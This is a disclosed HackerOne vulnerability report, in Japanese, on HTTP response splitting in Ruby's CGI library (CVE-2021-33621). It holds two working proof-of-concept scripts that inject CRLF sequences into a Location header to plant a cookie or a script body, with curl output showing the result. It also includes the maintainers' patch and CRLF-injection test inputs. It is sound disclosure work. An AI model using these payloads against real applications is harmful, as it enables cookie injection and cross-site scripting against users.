---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/high
  - cwe/http-response-splitting
  - env/web
  - stack/ruby
  - vuln/xss
substate: "resolved"
weakness: "HTTP Response Splitting"
enriched: true
body: true
date: 2022-11-24
submitted: 2021-05-21T01:10:02.734Z
bounty_usd: null
votes: 8
cve: "CVE-2021-33621", "CVE-2019-16254"
program: "[[programs/ruby|Ruby]]"
reporter: "htokumaru"
source: "https://hackerone.com/reports/1204695"
title: "RubyのCGIライブラリにHTTPレスポンス分割（HTTPヘッダインジェクション）があり、秘密情報が漏洩する"
---
# RubyのCGIライブラリにHTTPレスポンス分割（HTTPヘッダインジェクション）があり、秘密情報が漏洩する

> **Severity:** High | **Bounty:** undisclosed | **Votes:** 8 | **Program:** Ruby | **Disclosed:** 2022-11-24

- Report: [https://hackerone.com/reports/1204695](https://hackerone.com/reports/1204695)
- CWE: HTTP Response Splitting | CVE: CVE-2021-33621, CVE-2019-16254
- Submitted: 2021-05-21T01:10:02.734Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

PoC1:
```
#!/usr/bin/env ruby
require 'cgi'
cgi = CGI.new
url = "http://example.jp\r\nSet-Cookie: foo=bar;"     # External Parameter
print cgi.header({'status' => '302 Found', 'Location' => url})
```

Actual Result1:
```
$ curl -s -i http://localhost:8080/cgi-bin/cgi.ru
HTTP/1.1 302 Found
Date: Fri, 21 May 2021 00:46:33 GMT
Server: Apache/2.2.31 (Unix)
Set-Cookie: foo=bar;
Location: http://example.jp
Content-Length: 0
Content-Type: text/html

```

このケースでは不正なクッキーが注入される。


PoC2:
```
#!/usr/bin/env ruby
require 'cgi'
cgi = CGI.new
url = "http://example.jp\r\nStatus: 500\r\n\r\n<script>alert(1)</script>"  # External Parameter
print cgi.header({'status' => '302 Found', 'Location' => url})
```

Actual Result2:
```
$ curl -s -i http://localhost:8080/cgi-bin/cgi.ru
HTTP/1.1 500 Internal Server Error
Date: Fri, 21 May 2021 00:49:44 GMT
Server: Apache/2.2.31 (Unix)
Location: http://example.jp
Connection: close
Transfer-Encoding: chunked
Content-Type: text/html

<script>alert(1)</script>

```

このケースでは500 Internal Server Errorのため、Locationヘッダは無視され、JavaScriptが実行される。

## Impact

意図しないHTTPレスポンスヘッダやHTTPレスポンスボディを外部から注入できます。
単純なHTTPヘッダインジェクションでは、クッキーのインジェクションやリダイレクト等が主な影響となりますが、このケースでは、レスポンスボディが注入できるため、不正なJavaScript実行に及ぶため、影響が大きいと考えます。

他の言語の場合、PHPのheader関数は "\r"  "\n"   "\r\n"   等をすべてエラーにするため、上記の攻撃はできません。

過去のWEBrickやPumaにも類似の脆弱性がありましたが、これらは単独のキャリッジリターン "\r" による攻撃しかできず、リバースプロキシとしてNginxがあれば、Nginx側にてエラーになります。したがって、現実的な危険性はほとんどないと考えます。

https://www.ruby-lang.org/en/news/2019/10/01/http-response-splitting-in-webrick-cve-2019-16254/
https://github.com/puma/puma/security/advisories/GHSA-84j7-475p-hp8v

一方、今回報告した問題は、CGIの仕様上ウェブサーバーやリバースプロキシ側でエラーにすることはできないため、影響が現実的です。

## Timeline

- **Report Filed**
- **Report Triaged**
- **2021-05-21** @hsbt: ご報告ありがとうございます。

チーム内で相談し、この内容は脆弱性として修正を行う予定です。
- **2021-05-21** @mame: ご報告ありがとうございます。

キーや値に \r や \n が含まれている場合は例外にする方向で対応しようと思います。
後日パッチを作成してここに貼り付けますので、その際ご確認頂けると幸いです。
- **2021-05-22** @htokumaru: 承知しました。引き続きよろしくお願いいたします。
- **2021-05-26** @mame: 遅くなりました。ヘッダの生成でCRやLFが混入していたら例外を投げるようにするパッチです。
もしお気づきの点などあればお教えください。

```diff
diff --git a/lib/cgi/core.rb b/lib/cgi/core.rb
index bec76e0..62e6068 100644
--- a/lib/cgi/core.rb
+++ b/lib/cgi/core.rb
@@ -188,17 +188,28 @@ class CGI
   # Using #header with the HTML5 tag maker will create a <header> element.
   alias :header :http_header
 
+  def _no_crlf_check(str)
+    if str
+      str = str.to_s
+      raise "A HTTP status or header field must not include CR and LF" if str =~ /[\r\n]/
+      str
+    else
+      nil
+    end
+  end
+  private :_no_crlf_check
+
   def _header_for_string(content_type) #:nodoc:
     buf = ''.dup
     if nph?()
-      buf << "#{$CGI_ENV['SERVER_PROTOCOL'] || 'HTTP/1.0'} 200 OK#{EOL}"
+      buf << "#{_no_crlf_check($CGI_ENV['SERVER_PROTOCOL']) || 'HTTP/1.0'} 200 OK#{EOL}"
       buf << "Date: #{CGI.rfc1123_date(Time.now)}#{EOL}"
-      buf << "Server: #{$CGI_ENV['SERVER_SOFTWARE']}#{EOL}"
+      buf << "Server: #{_no_crlf_check($CGI_ENV['SERVER_SOFTWARE'])}#{EOL}"
       buf << "Connection: close#{EOL}"
     end
-    buf << "Content-Type: #{content_type}#{EOL}"
+    buf << "Content-Type: #{_no_crlf_check(content_type)}#{EOL}"
     if @output_cookies
-      @output_cookies.each {|cookie| buf << "Set-Cookie: #{cookie}#{EOL}" }
+      @output_cookies.each {|cookie| buf << "Set-Cookie: #{_no_crlf_check(cookie)}#{EOL}" }
     end
     return buf
   end # _header_for_string
@@ -213,9 +224,9 @@ class CGI
     ## NPH
     options.delete('nph') if defined?(MOD_RUBY)
     if options.delete('nph') || nph?()
-      protocol = $CGI_ENV['SERVER_PROTOCOL'] || 'HTTP/1.0'
+      protocol = _no_crlf_check($CGI_ENV['SERVER_PROTOCOL']) || 'HTTP/1.0'
       status = options.delete('status')
-      status = HTTP_STATUS[status] || status || '200 OK'
+      status = HTTP_STATUS[status] || _no_crlf_check(status) || '200 OK'
       buf << "#{protocol} #{status}#{EOL}"
       buf << "Date: #{CGI.rfc1123_date(Time.now)}#{EOL}"
       options['server'] ||= $CGI_ENV['SERVER_SOFTWARE'] || ''
@@ -223,38 +234,38 @@ class CGI
     end
     ## common headers
     status = options.delete('status')
-    buf << "Status: #{HTTP_STATUS[status] || status}#{EOL}" if status
+    buf << "Status: #{HTTP_STATUS[status] || _no_crlf_check(status)}#{EOL}" if status
     server = options.delete('server')
-    buf << "Server: #{server}#{EOL}" if server
+    buf << "Server: #{_no_crlf_check(server)}#{EOL}" if server
     connection = options.delete('connection')
-    buf << "Connection: #{connection}#{EOL}" if connection
+    buf << "Connection: #{_no_crlf_check(connection)}#{EOL}" if connection
     type = options.delete('type')
-    buf << "Content-Type: #{type}#{EOL}" #if type
+    buf << "Content-Type: #{_no_crlf_check(type)}#{EOL}" #if type
     length = options.delete('length')
-    buf << "Content-Length: #{length}#{EOL}" if length
+    buf << "Content-Length: #{_no_crlf_check(length)}#{EOL}" if length
     language = options.delete('language')
-    buf << "Content-Language: #{language}#{EOL}" if language
+    buf << "Content-Language: #{_no_crlf_check(language)}#{EOL}" if language
     expires = options.delete('expires')
     buf << "Expires: #{CGI.rfc1123_date(expires)}#{EOL}" if expires
     ## cookie
     if cookie = options.delete('cookie')
       case cookie
       when String, Cookie
-        buf << "Set-Cookie: #{cookie}#{EOL}"
+        buf << "Set-Cookie: #{_no_crlf_check(cookie)}#{EOL}"
       when Array
         arr = cookie
-        arr.each {|c| buf << "Set-Cookie: #{c}#{EOL}" }
+        arr.each {|c| buf << "Set-Cookie: #{_no_crlf_check(c)}#{EOL}" }
       when Hash
         hash = cookie
-        hash.each_value {|c| buf << "Set-Cookie: #{c}#{EOL}" }
+        hash.each_value {|c| buf << "Set-Cookie: #{_no_crlf_check(c)}#{EOL}" }
       end
     end
     if @output_cookies
-      @output_cookies.each {|c| buf << "Set-Cookie: #{c}#{EOL}" }
+      @output_cookies.each {|c| buf << "Set-Cookie: #{_no_crlf_check(c)}#{EOL}" }
     end
     ## other headers
     options.each do |key, value|
-      buf << "#{key}: #{value}#{EOL}"
+      buf << "#{_no_crlf_check(key)}: #{_no_crlf_check(value)}#{EOL}"
     end
     return buf
   end # _header_for_hash
diff --git a/test/cgi/test_cgi_header.rb b/test/cgi/test_cgi_header.rb
index bab2d03..9a3b058 100644
--- a/test/cgi/test_cgi_header.rb
+++ b/test/cgi/test_cgi_header.rb
@@ -176,6 +176,14 @@ class CGIHeaderTest < Test::Unit::TestCase
   end
 
 
+  def test_cgi_http_header_crlf_injection
+    cgi = CGI.new
+    assert_raise { cgi.http_header("text/xhtml\r\nBOO") }
+    assert_raise { cgi.http_header("type" => "text/xhtml\r\nBOO") }
+    assert_raise { cgi.http_header("status" => "200 OK\r\nBOO") }
+    assert_raise { cgi.http_header("location" => "text/xhtml\r\nBOO") }
+  end
+
 
   instance_methods.each do |method|
     private method if method =~ /^test_(.*)/ && $1 != ENV['TEST']

```
- **2021-05-26** @htokumaru: パッチありがとうございます。ソースコード確認およびテストにて問題ないと思いました。変数bufにデータを追加する際に、可変の値はすべて_no_crlf_check()を通す方針とお見受けしました。非常に手堅い方法と感じました。対応ありがとうございます。
- **2021-05-28** @mame: ご確認ありがとうございました。それではCVEを申請しておきます。このパッチは次のリリース（か、間に合わなければその次）に含めたいと思います。
- **2021-05-28** @htokumaru: 連絡ありがとうございます。承知しました。
- **Cve Id Added**
- **External User Joined**
- **2022-11-23** @hsbt: https://www.ruby-lang.org/en/news/2022/11/22/http-response-splitting-in-cgi-cve-2021-33621/ として cgi ライブラリの修正バージョンをリリースしました
- **Report Resolved**
- **2022-11-23** @htokumaru: 対応ありがとうございました
- **Not Eligible For Bounty**
- **Agreed On Going Public**
- **Agreed On Going Public**
- **Report Became Public**
